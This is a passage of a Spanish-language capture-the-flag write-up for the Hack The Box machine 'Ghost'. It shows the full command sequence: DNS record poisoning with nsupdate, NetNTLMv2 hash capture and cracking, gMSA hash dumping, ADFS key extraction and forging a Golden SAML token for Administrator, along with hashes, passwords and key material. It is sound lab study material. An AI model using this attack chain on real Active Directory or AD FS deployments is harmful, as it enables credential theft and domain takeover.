echo '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' | base64 -d > florence.ramirez.ccache
```

Exporto la variable de entorno de `Kerberos`.

```bash
export KRB5CCNAME=florence.ramirez.ccache 
```
## Shell as justin.bradley

### Enumeration

Y ahora podría intentar enumerar el dominio, `ACLs` y demás con `bloodhound-python`.

```bash
bloodhound-python -c all -u 'florence.ramirez' -no-pass -k -ns 10.129.231.105 -d ghost.htb --zip       
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: ghost.htb
INFO: Using TGT from cache
INFO: Found TGT with correct principal in ccache file.
INFO: Connecting to LDAP server: dc01.ghost.htb
INFO: Found 1 domains
INFO: Found 2 domains in the forest
INFO: Found 2 computers
INFO: Connecting to LDAP server: dc01.ghost.htb
INFO: Found 16 users
INFO: Found 57 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 20 containers
INFO: Found 1 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: linux-dev-ws01.ghost.htb
INFO: Querying computer: DC01.ghost.htb
WARNING: Could not resolve: linux-dev-ws01.ghost.htb: The DNS query name does not exist: linux-dev-ws01.ghost.htb.
WARNING: DCE/RPC connection failed: [Errno Connection error (10.129.231.105:445)] timed out
WARNING: Connection timed out while resolving sids
WARNING: Connection timed out while resolving sids

INFO: Done in 01M 36S
INFO: Compressing output into 20251111035550_bloodhound.zip
```
### Create Fake DNS Server
Y ahora cargamos el `zip` en `bloodhound`. Pero sin embargo no hay nada en el mismo.

Volviendo a las conversaciones de la pagina, veíamos que `justin` trataba de correr un script personalizado para activar el servidor `DNS` del `bitbucket.ghost.htb`, por lo que sabiendo que ese mismo script esta continuamente corriendo, podría tratar de crear un `dns` falso a nombre de ese subdominio, para que cuando `justin` corra el script se autentique contra mi en realidad y asi poder obtener un hash `NetNTLMv2`.

Para eso necesitamos de `nsupdate` el cual esta disponible en la shell de `florencia`.

```bash
server 10.129.231.105
zone ghost.htb 
update add bitbucket.ghost.htb 86400 A 10.10.17.19 
send
```

Y ahora actualizo el servidor `DNS`.

```bash
nsupdate -g dns.txt
```

Con el parámetro `-g` le indico que use el ticket Kerberos que esta en la variable de entorno del usuario.
### NTLMv2 hash

Y con mi `responder` vemos que recibimos el hash del `justin`.

```bash
 responder -I tun0
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

[..snip..]                                                                                                                                                   

[HTTP] NTLMv2 Client   : 10.129.231.105
[HTTP] NTLMv2 Username : ghost\justin.bradley
[HTTP] NTLMv2 Hash     : justin.bradley::ghost:fd1d069cd348e887:B76BB6A5E1A20F8F2C15ECBF1FDC12FA:0101000000000000C3CABBC8DA52DC018A18962D9C8E4D780000000002000800560051005A00350001001E00570049004E002D005800440035004E004F004C004F004400570033005A0004001400560051005A0035002E004C004F00430041004C0003003400570049004E002D005800440035004E004F004C004F004400570033005A002E00560051005A0035002E004C004F00430041004C0005001400560051005A0035002E004C004F00430041004C000800300030000000000000000000000000400000B93741BDB99D71F7C244C5B51C11B9BEA906AC93367F90079C744877030F43520A001000000000000000000000000000000000000900300048005400540050002F006200690074006200750063006B00650074002E00670068006F00730074002E006800740062000000000000000000 
```
### Cracking password

Metí el mismo en un archivo llamado `hash` y con `john` tratamos de romperlo.

```bash
john hash --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Qwertyuiop1234$$ (justin.bradley)     
1g 0:00:00:03 DONE (2025-11-11 04:13) 0.2557g/s 2739Kp/s 2739Kc/s 2739KC/s R2774178..Queenruma
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed.
```

Y como este usuario pertenece al grupo `Remote Management Users` puedo conectarme vía `WinRM`.

```bash
evil-winrm -i DC01.ghost.htb -u 'justin.bradley' -p 'Qwertyuiop1234$$'     
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc'' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\justin.bradley\Documents> type ../desktop/user.txt
17082ed3bf51d5ef5b3f5b42ecfe42cf
```
## Shell as mssqserver

Con las mismas credenciales intente loguearme, y me salió el siguiente mensaje:

![image-center](/assets/images/{57895AFA-F4BC-4F0B-96CE-6CDDBAC39753}.png)

### Reset password for adfs_gmsa$

Tengo la posibilidad de leer la clave GMSA del usuario `ADFS_GMSA$`.

![image-center](/assets/images/{880A0F5F-82C4-4CFA-ADDB-5EE795FFBB86}.png)

Para eso me clono esta herramienta.

```bash
git clone https://github.com/micahvandeusen/gMSADumper
```
### Validate hash 

Y la corro, obteniendo así el hash `NT` de este usuario.

```bash
python3 gMSADumper.py -u justin.bradley -p 'Qwertyuiop1234$$' -d ghost.htb
Users or groups who can read password for adfs_gmsa$:
 > DC01$
 > justin.bradley
adfs_gmsa$:::4fe25b5937bd03c947b11bbf8f270e3f
adfs_gmsa$:aes256-cts-hmac-sha1-96:3f897111732ab2c4143a69d6ce2c58fc93083eefef2a484ca4366e398b0e9e3c
adfs_gmsa$:aes128-cts-hmac-sha1-96:f216fc2c40ae4ee1d2ba818a40daae61
```

Valido las el mismo con `nxc`.

```shell
nxc smb 10.10.11.24 -u 'adfs_gmsa$' -H '4233c732e277554e44dbd82a890da314'

SMB         10.10.11.24     445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:ghost.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.24     445    DC01             [+] ghost.htb\adfs_gmsa$:4233c732e277554e44dbd82a890da314
```
## Golden SAML Attack

Básicamente con el acceso a esta cuenta, yo como el usuario `adfs_gmsa$` puedo performar sobre la pagina un `Golden SAML Attack`

> Este ataque como se explica en este [blog](https://netwrix.com/es/cybersecurity-glossary/cyber-security-attacks/golden-saml-attack/) requiere de la posesion de una cuenta de servicio de `AD FS (Active Directory Federation Service)`, donde una vez el usuario es autenticado con dicha cuenta puede usar herramientas como [ADFSDump](https://github.com/fireeye/ADFSDump) para extraer los datos necesarios, como un certificado con su clave privada, la clave del `Distributed Key Manager (DKM)` del Active Directory , entre otras cosas.


```bash
*Evil-WinRM* PS C:\programdata> .\ADFSDump.exe
    ___    ____  ___________ ____
   /   |  / __ \/ ____/ ___// __ \__  ______ ___  ____
  / /| | / / / / /_   \__ \/ / / / / / / __ `__ \/ __ \
 / ___ |/ /_/ / __/  ___/ / /_/ / /_/ / / / / / / /_/ /
/_/  |_/_____/_/    /____/_____/\__,_/_/ /_/ /_/ .___/
                                              /_/
Created by @doughsec


## Extracting Private Key from Active Directory Store
[-] Domain is ghost.htb
[-] Private Key: FA-DB-3A-06-DD-CD-40-57-DD-41-7D-81-07-A0-F4-B3-14-FA-2B-6B-70-BB-BB-F5-28-A7-21-29-61-CB-21-C7


[-] Private Key: 8D-AC-A4-90-70-2B-3F-D6-08-D5-BC-35-A9-84-87-56-D2-FA-3B-7B-74-13-A3-C6-2C-58-A6-F4-58-FB-9D-A1


## Reading Encrypted Signing Key from Database
[-] Encrypted Token Signing Key Begin
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
[-] Encrypted Token Signing Key End

[-] Certificate value: 0818F900456D4642F29C6C88D26A59E5A7749EBC
[-] Store location value: CurrentUser
[-] Store name value: My

## Reading The Issuer Identifier
[-] Issuer Identifier: http://federation.ghost.htb/adfs/services/trust
[-] Detected AD FS 2019
[-] Uncharted territory! This might not work...
## Reading Relying Party Trust Information from Database
[-]
core.ghost.htb
 ==================
    Enabled: True
    Sign-In Protocol: SAML 2.0
    Sign-In Endpoint: https://core.ghost.htb:8443/adfs/saml/postResponse
    Signature Algorithm: http://www.w3.org/2001/04/xmldsig-more#rsa-sha256
    SamlResponseSignatureType: 1;
    Identifier: https://core.ghost.htb:8443
    Access Policy: <PolicyMetadata xmlns:i="http://www.w3.org/2001/XMLSchema-instance" xmlns="http://schemas.datacontract.org/2012/04/ADFS">
  <RequireFreshAuthentication>false</RequireFreshAuthentication>
  <IssuanceAuthorizationRules>
    <Rule>
      <Conditions>
        <Condition i:type="AlwaysCondition">
          <Operator>IsPresent</Operator>
        </Condition>
      </Conditions>
    </Rule>
  </IssuanceAuthorizationRules>
</PolicyMetadata>


    Access Policy Parameter:

    Issuance Rules: @RuleTemplate = "LdapClaims"
@RuleName = "LdapClaims"
c:[Type == "http://schemas.microsoft.com/ws/2008/06/identity/claims/windowsaccountname", Issuer == "AD AUTHORITY"]
 => issue(store = "Active Directory", types = ("http://schemas.xmlsoap.org/ws/2005/05/identity/claims/upn", "http://schemas.xmlsoap.org/claims/CommonName"), query = ";userPrincipalName,sAMAccountName;{0}", param = c.Value);
```
### Save values

Muestra mucho output, del cual hay informacion la cual necesito.

```shell-session
❯ cat DKMKey1.txt
FA-DB-3A-06-DD-CD-40-57-DD-41-7D-81-07-A0-F4-B3-14-FA-2B-6B-70-BB-BB-F5-28-A7-21-29-61-CB-21-C7

❯ cat TKSKey.txt
AAAAAQAAAAA<SNIP>BN/BEsNEUSTXxm

❯ cat DKMKey2.txt
8D-AC-A4-90-70-2B-3F-D6-08-D5-BC-35-A9-84-87-56-D2-FA-3B-7B-74-13-A3-C6-2C-58-A6-F4-58-FB-9D-A1
```

Ahora usando estos archivos, solamente necesito de los `DKMKey` convertilos a decimales.

```shell-session
cat TKSKey.txt | base64 -d > TKSKey.bin

cat DKMKey1.txt | tr -d "-" | xxd -r -p > DKMkey.bin

cat DKMKey2.txt | tr -d "-" | xxd -r -p > DKMkey2.bin
```
### Forge cookie

Luego con [ADFSpoof](https://github.com/fireeye/ADFSpoof), puedo forjar una cookie para la pagina.

```bash
python3 ADFSpoof.py -b ../TKSKey.bin ../DKMkey.bin -s core.ghost.htb saml2 --endpoint 'https://core.ghost.htb:8443/adfs/saml/postResponse' --nameidformat 'urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress' --nameid 'Administrator@ghost.htb' --rpidentifier 'https://core.ghost.htb:8443' --assertions '<Attribute Name="http://schemas.xmlsoap.org/ws/2005/05/identity/claims/upn"><AttributeValue>Administrator@ghost.htb</AttributeValue></Attribute><Attribute Name="http://schemas.xmlsoap.org/claims/CommonName"><AttributeValue>Administrator</AttributeValue></Attribute>' 
    ___    ____  ___________                   ____
   /   |  / __ \/ ____/ ___/____  ____  ____  / __/
  / /| | / / / / /_   \__ \/ __ \/ __ \/ __ \/ /_  
 / ___ |/ /_/ / __/  ___/ / /_/ / /_/ / /_/ / __/  
/_/  |_/_____/_/    /____/ .___/\____/\____/_/     
                        /_/                        

A tool to for AD FS security tokens
Created by @doughsec

/home/zsln/Desktop/zsln/htb/ghost/ADFSpoof/SamlSigner.py:16: UserWarning: PKCS#12 bundle could not be parsed as DER, falling back to parsing as BER. Please file an issue at https://github.com/pyca/cryptography/issues explaining how your PKCS#12 bundle was created. In the future, this may become an exception.
  cert = pkcs12.load_key_and_certificates(data, password, default_backend())
/home/zsln/Desktop/zsln/htb/ghost/ADFSpoof/ADFSpoof.py:96: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  now = datetime.utcnow()
PHNhbWxwOlJlc3BvbnNlIHhtbG5zOnNhbWxwPSJ1cm46b2FzaXM6bmFtZXM6dGM6U0FNTDoyLjA6cHJvdG9jb2wiIElEPSJfSTlRV09BIiBWZXJzaW9uPSIyLjAiIElzc3VlSW5zdGFudD0iMjAyNS0xMS0xMVQxNzozNTozMS4wMDBaIiBEZXN0aW5hdGlvbj0iaHR0cHM6Ly9jb3JlLmdob3N0Lmh0Yjo4NDQzL2FkZnMvc2FtbC9wb3N0UmVzcG9uc2UiIENvbnNlbnQ9InVybjpvYXNpczpuYW1lczp0YzpTQU1MOjIuMDpjb25zZW50OnVuc3BlY2lmaWVkIj48SXNzdWVyIHhtbG5zPSJ1cm46b2FzaXM6bmFtZXM6dGM6U0FNTDoyLjA6YXNzZXJ0aW9uIj5odHRwOi8vY29yZS5naG9zdC5odGIvYWRmcy9zZXJ2aWNlcy90cnVzdDwvSXNzdWVyPjxzYW1scDpTdGF0dXM%2BPHNhbWxwOlN0YXR1c0NvZGUgVmFsdWU9InVybjpvYXNpczpuYW1lczp0YzpTQU1MOjIuMDpzdGF0dXM6U3VjY2VzcyIvPjwvc2FtbHA6U3RhdHVzPjxBc3NlcnRpb24geG1sbnM9InVybjpvYXNpczpuYW1lczp0YzpTQU1MOjIuMDphc3NlcnRpb24iIElEPSJfQkoxOU9BIiBJc3N1ZUluc3RhbnQ9IjIwMjUtMTEtMTFUMTc6MzU6MzEuMDAwWiIgVmVyc2lvbj0iMi4wIj48SXNzdWVyPmh0dHA6Ly9jb3JlLmdob3N0Lmh0Yi9hZGZzL3NlcnZpY2VzL3RydXN0PC9Jc3N1ZXI%2BPGRzOlNpZ25hdHVyZSB4bWxuczpkcz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC8wOS94bWxkc2lnIyI%2BPGRzOlNpZ25lZEluZm8%2BPGRzOkNhbm9uaWNhbGl6YXRpb25NZXRob2QgQWxnb3JpdGhtPSJodHRwOi8vd3d3LnczLm9yZy8yMDAxLzEwL3htbC1leGMtYzE0biMiLz48ZHM6U2lnbmF0dXJlTWV0aG9kIEFsZ29yaXRobT0iaHR0cDovL3d3dy53My5vcmcvMjAwMS8wNC94bWxkc2lnLW1vcmUjcnNhLXNoYTI1NiIvPjxkczpSZWZlcmVuY2UgVVJJPSIjX0JKMTlPQSI%2BPGRzOlRyYW5zZm9ybXM%2BPGRzOlRyYW5zZm9ybSBBbGdvcml0aG09Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvMDkveG1sZHNpZyNlbnZlbG9wZWQtc2lnbmF0dXJlIi8%2BPGRzOlRyYW5zZm9ybSBBbGdvcml0aG09Imh0dHA6Ly93d3cudzMub3JnLzIwMDEvMTAveG1sLWV4Yy1jMTRuIyIvPjwvZHM6VHJhbnNmb3Jtcz48ZHM6RGlnZXN0TWV0aG9kIEFsZ29yaXRobT0iaHR0cDovL3d3dy53My5vcmcvMjAwMS8wNC94bWxlbmMjc2hhMjU2Ii8%2BPGRzOkRpZ2VzdFZhbHVlPnNlaWZ6eWhsZzhta2xBS3dUUG9Bdlc1M